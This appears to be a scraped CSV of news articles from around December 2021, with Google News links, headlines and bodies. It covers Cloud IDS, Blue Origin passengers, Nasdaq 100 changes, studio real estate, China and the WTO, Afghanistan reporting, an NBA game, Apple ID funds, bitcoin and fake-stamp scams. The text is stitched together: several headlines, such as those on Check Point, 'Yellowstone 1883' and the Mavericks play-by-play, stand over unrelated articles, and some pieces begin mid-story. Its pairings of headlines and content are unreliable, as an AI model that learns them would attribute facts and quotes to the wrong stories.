Several Google Cloud customers like Avaya Lytics and Meditech use Cloud IDS. In another Google blog post on a Cloud IDS use case Tom Moriarty manager Information Security at Meditech said:

We are using Google Chronicle as our security analytics tool for our corporate environment. By integrating Cloud IDS with Chronicle we are able to analyze threats surfaced by Cloud IDS.

Cloud IDS pricing is based on a per-hour charge for the Cloud IDS endpoint and inspected traffic. More details of the service are available on the documentation pages.",https://news.google.com/articles/CBMiWGh0dHBzOi8vZW4uZ2xvYmVzLmNvLmlsL2VuL2FydGljbGUtY2hlY2stcG9pbnQtcHVzaGVkLW91dC1vZi1uYXNkYXEtMTAwLWluZGV4LTEwMDEzOTQwNTTSAQA?hl=en-US&gl=US&ceid=US%3Aen,Check Point pushed out of Nasdaq 100 Index,"Israeli cybersecurity company Check Point Software Technologies Ltd.

It’s also what’s sending him into outer space.

Bess is one of six passengers who’ll be soaring to the fringes of outer space thanks to Jeff Bezos’s space-exploration business Blue Origin. Liftoff for the company’s third manned space flight is scheduled for Saturday from its launch facility in the West Texas desert.

“Part of who I am is seeking adventure and not being afraid to take risks"" Bess 60 said in an interview. “It’s fulfilling a boyhood dream.""

Bess joins a small but growing group of ultra-wealthy adventurers who’ve bought their way into outer space thanks largely to competing ventures founded by billionaires such as Bezos Richard Branson and Elon Musk. Bess and his fellow paying passengers on the New Shepard mission -- space tech executive Dylan Taylor and Evan Dick a former managing director at Highbridge Capital Management -- won’t even be the first space tourists this week: Japanese retail mogul Yusaku Maezawa blasted off early Wednesday for a 12-day trip to the International Space Station.

The founder of online clothing retailer Zozo Inc. Maezawa 46 is the first space tourist to visit the ISS in more than a decade. He’s been tweeting for months leading up to the trip posting photos of his training and even offering to pay for others to join him when he becomes the first paying passenger to fly around the moon courtesy of Musk’s SpaceX in 2023.

Space tourism has been around for two decades but this year has seen a burst of activity due to a combination of soaring wealth more rocket operators and technological advances. While wannabe astronauts have more options than ever for facilitating their space journey that hasn’t translated to lower prices according to Eric Anderson chief executive officer of Space Adventures the company that coordinated Maezawa’s trip to the ISS.

“The costs are labor materials infrastructure and it’s all gone up over time"" Anderson said. “Imagine the cost of flying to Tokyo if you throw away the airplane after one flight.""

Bess a former executive at Palo Alto Networks Inc. and Zscaler Inc. who now invests through his own fund declined to say what he paid. Blue Origin auctioned off a ticket to its inaugural crewed flight in July for $28 million. Bess participated in the auction and though he didn’t win stayed in touch with Blue Origin’s sales team. The non-paying passengers on Saturday’s flight include Good Morning America co-host Michael Strahan and Laura Shepard Churchley daughter of Alan Shepard the first American in space.

Bess said physical preparation for the flight hasn’t been too arduous -- “they’ve really tried to make this as consumer-friendly as possible"" -- though he did begin exercising and dropped 17 pounds from his 6-foot 2-inch frame.

The flight will also serve as a bonding experience for Bess and his son Cameron a 23-year-old content creator and software developer who’ll also be on board. The pair used to shoot rockets together when Cameron was young but their shared time lessened as Bess’s career grew more demanding. The flight he said was an opportunity to reconnect.

Aside from sating his curiosity about space and the thrilling 63-mile-high view of Earth Bess said one thing he’s most looking forward to is meeting Bezos who’ll be at the launch site. He said he intends to ask him about his longer-term vision for Blue Origin and to thank him for helping realize his dream.

“Unlike SpaceX Jeff Bezos has funded this primarily at his own cost"" he said. “When you look at the facilities they’ve built and the engineering brilliance it’s the kind of commitment very few people on Earth can make.""

JPMorgan expects that CDW Corp. Fox Corp. Cerner Corp. Check Point Software Technologies Ltd. Trip.com Group Ltd. and Incyte Corp. will be removed from the index to make way for the new entrants.

JPMorgan Chase & Co.’s Min Moon the bank’s head of equity index research and program trading strategy said in a report that the two could be added to the closely watched tech-heavy benchmark late Friday when the Nasdaq exchange will announce annual membership updates to account for changes in market capitalization.

Such moves take effect after the close of trading on Dec. 17. Palo Alto Network Inc. which shifted its listing over from the New York Stock Exchange in October in the hopes of being included in the Nasdaq 100 Fortinet Inc. Zscaler Inc. and Datadog Inc. are also potential candidates for the index according to Moon.

What’s Next

Stocks entering the index can benefit from increased liquidity. A broader investor base because passive index funds and actively managed ones that are measured against it buy the shares.

“That’s good for the companies because if they have to raise capital” that issuance “is going to happen at a higher valuation” and in turn a lower cost of capital “which just makes it easier to fund projects” Nasdaq Chief Economist Phil Mackintosh said before the rebalancing.

Despite the benefits of being in the Nasdaq 100 stocks do not always gain on the news. Only 64% of new additions finished up on the first day following the announcement according to a study by Nasdaq.

That muted performance can be partly attributed to traders who buy-in ahead of the announcement using forecasts such as JPMorgan’s report Mackintosh said. “Traders are already positioning for the news. So when the news comes out it might not be the big positive shock that you think because the markets like ‘yeah we knew that stuff’” he said.

While the immediate reaction might be a bit lackluster. Stocks do outperform the market by an average of 1% from five days pre-announcement to post-index inclusion according to the Nasdaq study of Nasdaq 100 additions from 2010 to 2020.

The Nasdaq 100 is up 32 per cent over the past year outperforming other benchmark indices such as the S&P 500 and the Dow Jones Industrial Average.",,,

An explosion of streaming platforms a surge in content and a shortage of space to produce it all has ushered in a frenetic era of building buying and expanding soundstages. It’s a competitive market one led by Michael Hackman founder and CEO of Hackman Capital Partners credited with turning global studio real estate into a thriving new asset class.

Kaufman Astoria Studios in Queens Anthony Behar/Sipa via AP Images

Over the past five months alone Hackman Capital Partners has struck deals to acquire the historic CBS Radford lot in Studio City; Wardpark Film and Television Studios Scotland’s largest production facility; New York’s Kaufman Astoria Studios in Queens (the 1920s original home of Paramount Pictures); and the two largest film studios in Ireland Ardmore Studios and Troy Studios. It also pacted with the City of Toronto to develop a waterfront complex Basin Media Studios.

Other Hackman Capital properties include The Culver Studios; Television City; MBS Media Campus; Raleigh Studios in Hollywood and Saticoy; Sony Pictures Animation Studios (in LA); Second Line Stages in Louisiana. Eastbrook Studios in London is currently under construction as is a state-of-the-art studio complex in Downsview in northwest Toronto. The Wharf Studios a new campus in London opens in January.

That’s 16 studios soon to be 19 when deals close with more than120 active soundstages and another 90 planned or in development for well over $10 billion in studio assets.

“In every market where we open demand has exceeded the supply. At some point that will come into balance” Hackman said — just not anytime soon.

In a rare interview the longtime real estate developer tells Deadline how becoming a supporting player for film and TV production was the business opportunity of a lifetime and when it first started for him in Culver City.

DEADLINE: Hackman is a key player in the entertainment industry but many Deadline readers may not know you. What’s your backstory?

MICHAEL HACKMAN: I grew up in Columbus Ohio one of five children. Two sisters (and my two children) work with me in the business. I graduated from the Ohio State University moved to L.A. in 1978 and launched my company in 1986 focused on industrial real estate [warehouses factories] building up a portfolio of more than 400 buildings totaling over 35 million square feet. By 2005 I was on to the next concept urban infill [developing sites in a market that’s already mostly built out]. I started to focus on Culver City because I lived in L.A. It was dynamic had three metro rail stops planned a great future a great location. We started to buy up buildings focusing on creative office development. One of our first projects was the 150000-square-foot creative office campus in the Hayden Tract which was then leased to Beats by Dre. Then Apple bought Beats.

DEADLINE: That’s a step closer to entertainment. When why the jump into studios?

HACKMAN: In 2014 we bought The Culver Studios—the historic 1918 site where Gone With the Wind Citizen Kane ET The Matrix and many others were filmed—and embarked on an innovation plan that would modernize and more than double the lot while preserving the historic structures. Eventually Amazon became our tenant.

At the same time I met Rick Nelson CEO of The MBS Group which provides lighting and grip rental equipment and production services and also operates film and TV studios. He was based at MBS Media Campus then called Manhattan Beach Studios. We started to really study the business. Technology and broadband were developing and it was clear to us where things were headed. We knew there was going to be growth and that it would be a game-changer.

Then at the end of 2018 we had the opportunity to buy CBS Television City–25 acres in the center of L.A. one of the best locations in the city. We were able do that deal in 2019 a seminal moment when we also had the opportunity to purchase The MBS Group and the MBS Media Campus [from Carlyle Group]. Once that happened everything took off. We were now not only able to buy studios but also able to provide critical services to the content industry. We worked hard with the MBS team to grow their services and footprint. [Editors note: MBS has over 850 employees services almost 400 soundstages through 65 locations and supports more than 400 productions annually.]

DEADLINE: How would you characterize the soundstage market?

HACKMAN: Highly competitive. In L.A. there are 500-plus soundstages. Hackman Capital Partners as big as it is owns about 70. In New York there are 255 soundstages we own 38. We don’t have a controlling position in any one market and it’s not our intent to do so. We work with many other owners and companies to service their studios.

In each of the major markets like L.A. and New York there’s close to 100% occupancy. They turn over from one show to another. In every market where we open demand has exceeded the supply. At some point that will come into balance. New York in particular is a greatly underserved market. It needs more stages but also bigger ones. Only about 50 of New York’s soundstages are greater than 15000 square feet.

[Editors note: A few more will come online with Lionsgate Studios from Robert Halmi and Fehmi Zeko’s Great Point Capital — with the studio as long-term anchor tenant – set to open in Yonkers. And Steiner Studios is branching out from its Brooklyn Navy Yard home to build a second studio complex in Sunset Park Brooklyn. They are among developers and private equity firms including Hudson Pacific Properties and Blackstone (Sunset Studios in L.A.) TPG Real Estate Partners (Cinespace Studios in Chicago and Toronto Babelsberg in Germany) Commonwealth Group (Blackhall Studios in Atlanta) and a handful of others who have moved into the soundstage space.]

DEADLINE: Why the boom? Streamers and media companies are spending billions of dollars on content. Is it just that more content is being produced?

HACKMAN: Yes but not only that. Soundstages are also in demand because of growth in technology as well. You would think it would be the reverse but technology enables producers to do more on a soundstage than was previously possible. For example virtual production is becoming a game changer as it allows producers flexibility — they can avoid taking the traveling circus out on location. In general there’s also significant value to being on a real studio lot where you can control who goes in or out not to mention controlling production costs and timelines plus producers have more creative freedom. This has become even more important with Covid. A stage is self-contained and a studio lot provides the ability to create an ecosystem to satisfy all your production needs within one campus. The studio concept has been around for over 100 years but has become even more important as we go forward.

The Wharf in London Hackman Capital Partners

DEADLINE: You stressed that you are not in the content business?

HACKMAN: We are not in the “content creation” business. If you equate content to mining gold our business is to supply the pots the pans and the jeans all wrapped in a blanket of great service. We want to make sure all of our customers get everything they need to make the best content possible. Our business has grown way beyond property infrastructure to production logistics and to providing a complete package of turnkey services to our customers. In addition to best-in-class facilities we are providing tools to help content creators turn their vision into reality.

The first thing that Rick Nelson taught me is that the word “no” does not exist in the world of production. You find a way to make it happen. A big part of what the firm does is production planning and advisory services for content creators helping them find a home for their shows whether or not it’s on one of our properties.

DEADLINE: Is it fun?

ViacomCBS

HACKMAN: It’s fun. I grew up in the ’60s and ’70s. I always loved television and movies. Many of the shows I loved were filmed at CBS Studio Center. The business is exciting. I marvel at it. It never gets old for me. I’ve been through so many soundstages and every time I see the sets I am absolutely in awe of the talent that exists in this industry. The amount of talent and how hard everyone works below the line is incredible; that is the most impressive part of the business.

Some of the studios we have bought have historic components and it’s incredibly rewarding to transform them into state-of-the-art facilities. I bring this passion from my real estate background to really take these iconic studios back to their glory. It’s really thrilling to renovate and rebuild an existing studio but also to put your footprint on building something new and creative while helping to positively impact communities and create jobs.

DEADLINE: Explain the studio system of hub and spoke. It’s not just for airlines anymore apparently?

HACKMAN: The hubs would include L.A. New York Toronto Vancouver and London. The spokes are markets like Atlanta; Louisiana; Albuquerque New Mexico; Ireland; Scotland. Spokes can be overflow markets or just smaller up-and-coming markets that can also stand on their own. Jason Hariton Chief Real Estate Officer of The MBS Group coined the phrase “hub and spoke” for studio space when he was head of worldwide production operations and real estate for Netflix.

Jason Hariton

Hariton whom you could say is a Hackman secret weapon oversaw 1000 productions a year at the giant streamer. He’s fourth generation in the business; his great-grandfather was a Hollywood driver his grandfather worked at Paramount and his father at Universal. Jason makes sure we are building or buying the right assets in key hub-and-spoke markets and that we continue to grow that way around the world. All of our company’s success is possible because we have a phenomenal team.

In New York we have Silvercup and Kaufman Astoria. In Toronto we have two deals on the waterfront and a large studio on 48 acres. We’re looking for projects in Vancouver where MBS already manages studios and services soundstages.

MBS has a Canadian group with 200 people and a group in London of around 150 people where we have Eastbrook Studios The Wharf MBS Innovations Lab and are trying to do more.

In L.A. we have MBS Media Campus The Culver Studios Raleigh Studios the Television City and soon to close on CBS Studio Center. We don’t own production facilities in Atlanta but MBS services most of them.

DEADLINE: You mentioned a window for soundstage supply and demand to come into balance. How long?

HACKMAN: We are working hard to meet the meteoric demand. The growth in viewership around the world combined with the increasing access to broadband will continue to create new customers for streamers in the long term and major studios in major hub-and-spoke markets will continue to be the important centers for content creators.",https://news.google.com/articles/CBMidWh0dHBzOi8vd3d3LnNjbXAuY29tL2Vjb25vbXkvY2hpbmEtZWNvbm9teS9hcnRpY2xlLzMxNTkyMDIvY2hpbmEtbWFya3MtMjAteWVhcnMtd3RvLXdhcnktZXllLXJpc2luZy1jb3N0cy1hbmQtd2VzdGVybtIBAA?hl=en-US&gl=US&ceid=US%3Aen,China marks 20 years at WTO but rising costs and trade tensions loom large,"However it was after 2001 when the mainland gained entry into the World Trade Organization (WTO) that Chai’s business took off. Japanese American and European orders flooded in boosting his workforce to 10000 at its peak.

The local government rolled out the red carpet offering 1.2 acres of land for 30 years at 1 million yuan (US$157000) just as the small border city was designated a special economic zone and export hub by former paramount leader Deng Xiaoping.

When Hong Kong businessman Chai Kwong-wah decided to open a factory in Shenzhen in 1993 cheap land and labour were top considerations for his Hello Kitty and Disney toy business.

“China has developed much more than I expected at the time” said the 72 year old.

Millions of manufacturers either privately owned government controlled or foreign funded mushroomed in China’s coastal provinces delivering cheap but good-quality consumer goods to households across the world and transforming the country from an agricultural backwater into the world’s second largest economy.

Chai despite being a beneficiary of the process was eventually defeated by rising production costs and in 2016 his factory was demolished to give way to local subway construction.

Like many labour-intensive exporters he moved his toy factory to Vietnam upon the request of Japanese clients as Shenzhen was by then a technology hub with star companies like Tencent Huawei Technologies Co. and DJI

“I saw the monthly salary of Chinese workers kept jumping to more than 5000 yuan from 200 yuan in early 1990s” he said. “In contrast the labour cost in Vietnam was only US$200 even during the severe pandemic period.”

Relocations due to rising costs were on the agenda when Chinese officials and scholars met this week to review two decades of economic development since China joined the WTO.

Inclusion into the multilateral trading system has been key to the country’s economic success over the past 20 years. China overtook Germany to be the world’s top goods exporter in 2009 and surpassed Japan to become the world’s second largest economy the following year.

China now accounts for about 18 per cent of the global economy and is poised to surpass the United States in size within a decade.

If our exports are blocked overcapacity will emerge and the job market will be challenged while our internal circulation will be hindered Chen Deming

But China’s entry into the multilateral trading system has not come without risks.

Speaking at a seminar on Wednesday in Beijing former commerce minister Chen Deming raised the issue of job losses and social stability as many businesses relocate due to rising land labour and other costs.

“We must pay attention to the problem of labour traps when our trade turns basically balanced [from the current huge trade surplus]” Chen said.

“If our exports are blocked overcapacity will emerge and the job market will be challenged while our internal circulation will be hindered.”

During Chen’s tenure as commerce minister between 2007-13 about 30 million migrant workers in export-oriented coastal factories lost their jobs as overseas orders dropped amid the 2008 global financial crisis.

Beijing had a huge employment problem again early last year following unprecedented lockdowns transport and production disruptions because of the coronavirus pandemic. The job market recovered quickly after the initial outbreak was contained and the export sector has been a key driver of China’s economic recovery

Exports rose 31.1 per cent year on year to US$3 trillion in the first 11 months of this year. Outbound shipments to the US rose 28.3 per cent to US$519.9 billion in the period.

Long Guoqiang deputy head of the Development Research Centre of the State Council said China faces two grave trade challenges including competition from lower-cost developing countries in making labour-intensive products; and rivalry with advanced economies in terms of capital and technology-intensive products.

“We must seize the strategic opportunities arising from technology-driven digital transformation and the global embrace a low-carbon economy” he told the same conference.

Endeavours to climb up the global value chain should concentrate on transforming traditional industries opening service sectors and developing a digital services trade he added.

Beijing advisers however expressed concerns over the fast deteriorating external environment most notably relations with Western countries that created post-World War II international economic rules.

The US-China trade war resulted in tariffs being imposed on billions of dollar’s worth of products and fuelled the threat of decoupling. The situation has not changed substantially under the Biden administration’s policy of strategic competition with China and its pursuit of trade blocs with allies.

Furthermore the WTO dispute settlement mechanism has been paralysed since former president Donald Trump blocked the appointment of new judges.

“Trade free trade agreements and China’s entry into WTO have been highly politicised and often turned into a tool of US political struggles” said Wang Yong director of Peking University’s Centre for American Studies.

“Given considerations of ideology and maintaining US hegemony calls have arisen to push China-US decoupling and restructure the global industry chain.”

De-globalisation and anti-China endeavours have further weighed on the economy which is struggling with a diminishing labour dividend fast-ageing population  ballooning debt and economic slowdown.

It’s key for China to improve international competitiveness over the next 20 years and prevent it from falling into the middle-income trap Yi Xiaozhun

Yi Xiaozhun who helped negotiate China’s WTO accession said he regretted Washington’s zero-sum mentality when dealing with Beijing and the multilateral trading system.

Beijing should continue opening its market improve the business environment and attract more foreign investment so it firmly embed itself in the global value chain and defeat decoupling he said.

“We should continue to promote more institutional openings especially that of the service sector” said Yi who was the first Chinese national to be deputy director general of the WTO.

“It’s key for China to improve international competitiveness over the next 20 years and prevent it from falling into the middle-income trap.”

China remains a magnet for global investors as its receipt of foreign direct investment rose 23.4 per cent from a year earlier to US$142 billion in the first 10 months of 2021.

However foreign governments and businesses still have concerns about a variety of issues such as the dominance of state-owned enterprise industrial subsidies  intellectual property rights protection cybersecurity data protection and policy transparency.

Businessman Chai said it was far more difficult for foreign small and medium-sized firms to invest in China than two decades ago due to a higher technology and capital threshold.

“Whether for Hong Kong capital or foreign capital their advantages are not as obvious as they were in the past” he said. “Also soaring costs have taken a big bite of profits.”

He said however Beijing’s decision to focus on developing the domestic market and home-grown technology as part of its “dual circulation” strategy was smart.

“It is now very important to expand the size of the middle-income group … It is also necessary to shift [focus] to the domestic market which is more important than expanding exports” he said.

In the 2035 development vision released earlier this year Beijing adopted the “dual circulation” strategy to counter foreign containment and build a “moderately prosperous” nation.

Meanwhile China’s leadership has tried to assure the rest of world it will open its market wider and follow international rules with applications submitted for the Comprehensive and Progressive Agreement for Trans-Pacific Partnership and the Digital Economy Partnership Agreement.

“The Chinese government will continue to firmly support the WTO-centred multilateral trading system and safeguard its main role in international rule making” commerce ministry spokesman Gao Feng said at a media briefing on Thursday.",https://news.google.com/articles/CBMiU2h0dHBzOi8vY2EubW92aWVzLnlhaG9vLmNvbS95ZWxsb3dzdG9uZS1wcmVxdWVsLTE4ODMtcGFyYW1vdW50LW1ha2VzLTIzMTUzMDQ0Ni5odG1s0gEA?hl=en-US&gl=US&ceid=US%3Aen,'Yellowstone' Prequel '1883' From Paramount+ Makes Lavish Debut In Las Vegas,"Pioneer days never looked so good.

But when the U.S. completes its exit from the country as the Taliban took control so did essentially all U.S. reporters.

Since then reporting from the country now firmly under Taliban control has been sparse. But on Sunday CBS’ 60 Minutes had a report from the country which is in the midst of a humanitarian crisis with food medicine and other critical resources lacking.

Correspondent Sharyn Alfonsi speaking to The Hollywood Reporter said that getting the story done was no easy task. In fact even getting into Afghanistan is a bit of a challenge right now.

“Obviously it’s not as easy as buying a plane ticket” Alfonsi said.

So Alfonsi her producer Ashley Velie and their crew hitched a ride with the United Nations which was delivering humanitarian aid via Doha and Islamabad.

“Even as we were coming into Afghanistan we didn’t know if they were going to let us in or not it was a little bit of a gamble” Alfonsi said. “So we got to the airport the humanitarian workers from the U.N. were going in and they were letting them through. Our crew photographers and sound who were from Europe their passports got stamped and they went right through and then my producer Ashley Velie and I with our American passports and being women show up and the guy gave us this look of death stamped the passports and threw it back at us. But we were like OK we are in and we hit the ground running.”

Alfonsi met with some of the groups delivering the aid as well as families impacted by the lack of supplies. They also visited Kabul’s children’s hospital where the doctors have worked without pay since the Taliban took control.

“There’s just wards of children who are suffering from malnutrition and the doctors say they don’t have medicine to give them they don’t have food to give them” Alfonsi recalled.

“For the humanitarian groups they wanted to tell their story. They are actively nonpolitical; they don’t take sides” she added. “They just want to alert the world the people that hold the purse strings that this is what’s happening.”

But the Taliban are a whole other story. Alfonsi was able to secure an interview with a Taliban minister for the report — though it almost didn’t happen.

“The interview with the Taliban was a little more complicated. We used a third party who was helping us to get in touch with them and it was on and off” Alfonsi recalled. Eventually they secured a meeting though without any commitment to appear on camera.

“My photographer … said ‘The last time I was here the Taliban was shooting at me and now we are going into their building.’ We went in there we sat in his office for an hour and spoke and he still wasn’t convinced that he would go on camera and he finally agreed to” Alfonsi said. “He tried to stop the interview a couple of times during the course of the interview but he ultimately kept going.”

And when it was over they had an unexpected request.

“He invited us in to the basement to eat with these Taliban leaders” Alfonsi said. “When people ask you to eat with them you do … but we made sure we had the media of our interview in our pockets on us physically. We didn’t want them to take the interview. So then we left and we were like OK that just happened.”

But in a country that has seen a dearth of foreign reporting in recent months Alfonsi added that she wants to shine a light to what is happening in the country beyond the geopolitics.

“There are 38 million people left in this country and winter is coming and there is not enough food and they can’t get access to cash and the aid agencies are struggling as well to get to these people” Alfonsi said. “There is so much need.”"

Just check the fourth-quarter box score from Sunday night.

The Thunder (8-18) scored 13 points in the final 12 minutes of a 103-84 loss to the Mavericks (13-13) at Paycom Center. It was the Thunder’s lowest-scoring fourth quarter of the season … by a five-point margin.

“We had some good looks and missed them” Shai Gilgeous-Alexander said.

That’s enough to explain the result of a forgettable game that was short on highlights — outside of a terrific halftime performance from the acrobatic Olate Dogs.

OKC shot 5-of-19 in the fourth quarter including 2-of-10 from 3-point range.

“I thought they outplayed us much of the night” Thunder coach Mark Daigneault said “and we just made enough plays to hang around and stay within striking distance.”

Gilgeous-Alexander led the Thunder with 18 points but it came on 6-of-15 shooting. Gilgeous-Alexander was 1-of-5 from 3-point range.

Jalen Brunson carried the Mavericks in the second half. He scored 14 of his team-high 18 points after halftime.

Kristaps Porzingis (13) was the only other Maverick who finished in double figures.

Here are four more takeaways:

'It was electric':Why the Thunder with Shai Gilgeous-Alexander and Lu Dort is Canada's second team

Lu Dort extends streak exits

Luguentz Dort has made at least one 3-pointer in 40 consecutive games.

That includes all 25 games he’s played this season.

Dort remarkably enough has the second-longest streak of games with at least one 3-pointer made. Stephen Curry is the only player with a longer streak.

Dort was 2-of-5 from deep in the first half against the Mavericks.

Dort is shooting 33% from 3-point range slightly down from last season but he’s firing 3-pointers at a career-high volume — 7.6 per game.

It was a good thing Dort extended his streak in the first half because he was ruled out at halftime with a left ankle sprain.

“They retaped him at halftime tried to check him out a little bit” Daigneault said. “It wasn’t wise to put him back out there. We’ll see how he looks in the morning.”

Theo Maledon started the third quarter in place of Dort.

“Lu’s for sure missed” Gilgeous-Alexander said. “Big part of our team. With that being said we still had enough to get it done.”

By the numbers

An odd thing happened Sunday night.

The Thunder and Mavericks tied in fastbreak points: 0-0.

“I didn’t notice that” Daigneault said. “I thought the stuff that popped off the box score was the paint … they obviously owned us in the paint tonight on both ends.”

The Mavericks outscored the Thunder 50-20 in the paint.

Dallas’ bench also had a big advantage outscoring the Thunder’s bench 54-29.

Moses Brown returns

Not even a year has passed but it’s still hard to believe Moses Brown started 32 games for the Thunder last season.

Brown was a two-way contract player who leveraged his breakout success into a standard NBA contract.

The 7-foot-2 center was easy to root for. He recorded 12 double-doubles and will always have that 21-point 23-rebound game against the Celtics.

Brown was traded to Boston in the offseason as part of the Al Horford/Kemba Walker swap.

Brown was then flipped from Boston to Dallas in a different deal.

Brown has only averaged five minutes per game with the Mavericks but Sunday night was his best game of the season.

Brown scored a season-high 15 points on 5-of-6 shooting. He added six rebounds.

“We poured a lot into him and we really like him” Daigneault said. “We always wanna see guys that pass through the program have success when they leave here.”

'He’s done that all season long':Shai Gilgeous-Alexander happy to assist in Thunder's win at Raptors

Luka Doncic out

Mavericks superstar Luka Doncic (left ankle soreness) was out Sunday night.

Defending Dallas obviously looks a lot different with Doncic off the floor. The Mavericks take on a whole new identity offensively.

“Sometimes when a player’s out it doesn’t change the style very much” Daigneault said before the game. “The Lakers are a good example of that. They’re an iso team that plays in transition and then they slow down and they play matchups. When (Anthony) Davis is in that’s how they play and when Davis was out the other night that’s how they played.

“(Dallas) is a team that’s a lot different stylistically to be honest with you. When (Doncic) is out … you can just expect a little bit more pace up the court. You can expect more ball movement side to side.”

As mentioned the pace turned out to be incredibly slow. The Mavericks made things even slower with take foul after take foul.

Still Dallas did enough to overcome Doncic’s absence.

Before Sunday night Doncic had missed four games this season. The Mavericks were 0-4 without him.

Doncic already a two-time All-NBA player at age 22 is averaging 25.6 points 8.0 rebounds and 8.5 assists per game this season.",https://news.google.com/articles/CBMiTGh0dHBzOi8vY2EubW92aWVzLnlhaG9vLmNvbS9kYWxsYXMtbWF2ZXJpY2tzLXZzLW9rbGFob21hLWNpdHktMDAwNTExMzQyLmh0bWzSAQA?hl=en-US&gl=US&ceid=US%3Aen,Dallas Mavericks vs. Oklahoma City Thunder: Play-by-play highlights and reactions,"The Dallas Mavericks (12-13) play against the Oklahoma City Thunder (17-17) at Paycom Center

It’s possible and it serves as a nice way for anyone who wants to set a budget to manage their account balance.

With this approach you can make transactions on iTunes and App Store without having your credit card or PayPal account always linked to your Apple ID. Instead you can use your Apple ID balance for purchasing apps and subscribing to Apple services such as iCloud and Apple Music.



A valid payment method is necessary to make purchases from Apple but this allows for some more options. For example you can transfer some money to your Apple ID balance and remove the linked credit card or PayPal account if you have security concerns. That situation could be useful if you want to let your kids download paid apps or subscribe to services without giving them endless access to your credit card. By adding funds to their accounts you’re also limiting how much money they can spend on the App Store.

Let’s take a look at how you can add funds to an Apple ID from a Mac. You may already be familiar with this process on an iPhone or iPad so let’s familiarize now with the computer side of things.

How to Add Funds to Apple ID on Mac

To add funds to your own Apple ID you’ll need to temporarily add a valid payment method like your credit card or PayPal account. Once you’ve done that simply follow the steps below to get started.

Launch the App Store on your Mac from the Dock.



This will take you to the Discover section of the App Store. Here click on your Apple ID name located at the bottom of the left pane.



Next click on “View Information” located at the top next to the Redeem Gift Card option as shown in the screenshot below.



Enter your Apple ID login details when you’re prompted to sign in.



Now scroll down to the Apple ID Account section located below Hidden Items. Click on “Add Funds to Apple ID” to continue.



Here select the amount you want to add as Apple ID Balance. You can input a custom value by clicking on “Other”. Once you’ve made the selection click on “Next”.



Now you’ll be prompted to confirm your purchase. You’ll be prompted to sign in to your Apple account or use Touch ID to authenticate the purchase.





There you go. You’ve successfully added funds to your Apple account.

Now that you’ve added some money to your Apple ID balance you can remove your linked payment method from the Apple account and still continue making purchases from the App Store and subscribe to services until you run out of balance.

This is just one way to add funds to an Apple account. If you don’t want to link a payment method to your Apple account at all you can add funds to your Apple ID by sending a gift card by email from another account. This Apple Gift Card can then be redeemed on the App Store for Apple ID balance. You could ask your friends or family to do this for you and you could pay them in cash. This method can be put to good use for transferring funds to your kid’s Apple account right from your device.

If you use an iPhone or iPad you may also be interested in learning how to add funds to your Apple ID on your iOS/iPadOS device. Are you setting up a new Apple account for one of your kids? In that case you can create an Apple ID without even adding a credit card by simply trying to download a free app from the App Store which then allows access to free downloads and then by using the funds adding methods we’ve covered lets you set a balance for those accounts.

Crypto bulls as always are keeping the faith. That includes MicroStrategy CEO Michael Saylor who added bitcoin to his company’s balance sheet last year. Since then he’s been an outspoken advocate. Right now he doesn’t see many — any? — long-term obstacles to prices going higher.

“The only legitimate risk is a black swan – an unknown unknown” he said in an interview. He dismissed some potential challenges: “Has it been hacked? No it hasn’t been hacked. Is it going to be banned? No it’s not going to be banned. Can it be copied? We copied it ten thousand times. Every copy has failed.”

Saylor has said that he believes bitcoin can go up forever a sentiment he repeated to Yahoo Finance Live. Two of the main drivers he said are technology adoption and inflation.

“It’s going to be driven by technology as it gets built into Facebook and Google and Apple it’s built into Square and PayPal. And so as you build in technical utility that’s going to drive more adoption” he said.

He acknowledged the recent and potential future volatility: “It’s not going to go up uniformly in a perfect exponential curve but I don’t think we’ll see a world where technology slows down and I don’t think we’re going to see a world where currencies don’t keep inflating.”

To be sure some crypto analysts have identified risks. In the short term selling in a highly-leveraged asset like bitcoin can cascade when it falls below certain thresholds and indebted holders are forced to liquidate. And there’s some debate over whether bitcoin is indeed an inflation hedge. After all the potential threat of higher interest rates — a reaction to rising inflation — seems to be one of the reasons behind the recent sell-off.

Still Saylor has largely been well-served by his bitcoin positioning thus far. MicroStrategy shares have risen some 380% since he first disclosed in August 2020 the company was shifting cash in its corporate Treasury into bitcoin. Since then the company has built its position including purchases funded by selling debt. Saylor disclosed the latest buy via a tweet earlier this week.

MicroStrategy has purchased an additional 1434 bitcoins for ~$82.4 million in cash at an average price of ~$57477 per #bitcoin. As of 12/9/21 we #hodl ~122478 bitcoins acquired for ~$3.66 billion at an average price of ~$29861 per bitcoin. $MSTRhttps://t.co/Xke8QhoYpy — Michael Saylor⚡️ (@saylor) December 9 2021

While MicroStrategy still operates as an enterprise software company it has also become what Saylor calls a digital property company. He said the two sides are complimentary.

“As an operating company we can generate cash flows and sweep those cash flows into bitcoin. We can finance cash flows at low cost-to-capital and that’s another benefit we have as an operating company… Our employees are happier our customers are happier our brand has accreted one hundred times since we assumed the Bitcoin strategy” he said.

Read more

Dennis Creedon was scrolling through his Facebook feed when he saw a sale on stamps.

The social media website showed an ad offering 100 regular U.S. postage stamps for $46 lower than their $58 face value. The ad noted that stamp prices had jumped in August and warned they could rise again. With the holidays approaching Creedon decided to buy them.

But Creedon who lives at the Pier 5 condos near Penn’s Landing soon grew suspicious. The stamps didn’t arrive until a month after his September order. When they did come they were in an envelope postmarked from China that called the stamps “stickers.” These are signs that they’re likely fake postal inspectors later said.

Meta — the company formerly known as Facebook — initially told Creedon the online seller did not violate its rules according to a message it sent him. But after The Inquirer asked about his case Meta removed the advertiser from its platform. Creedon 67 also got a refund from PayPal after The Inquirer’s involvement.

“These pages have been removed from our platform after repeatedly violating our policies against deceptive and misleading practices meant to scam people out of money” a Meta spokesperson said.

Creedon appears to be the victim of a growing number of online shopping scams made worse by the pandemic which has pushed people to buy more goods online. Many online fraud reports originate from ads on Facebook and Instagram according to experts. One of the popular grifts lately is selling counterfeit stamps as consumers send holiday cards to loved ones.

Meta which owns Facebook and Instagram prohibits advertisers from making misleading product claims. But critics say tech giants like Meta aren’t doing enough to police their platforms. Consumers and companies impersonated by scammers have a hard time getting fraudsters removed from Facebook said Jason Thatcher a Temple professor for management information systems. He said platforms skirt responsibility by claiming they aren’t legally responsible for the conduct of their users.

Social media scams

Online shopping fraud has grown for years but has drastically increased during the pandemic according to the Better Business Bureau (BBB) a nonprofit that receives tens of thousands of consumer complaints per year. About 40% of those reports involve victims of online ads found on Facebook and Instagram. The BBB noted that while there are many legitimate businesses from China it had received thousands of online shopping complaints mentioning that country.

The number of online shopping fraud reports that the BBB received nearly doubled from 9050 in 2019 to 17942 in 2020.The nonprofit projects it will receive 16892 reports by the end of this year.

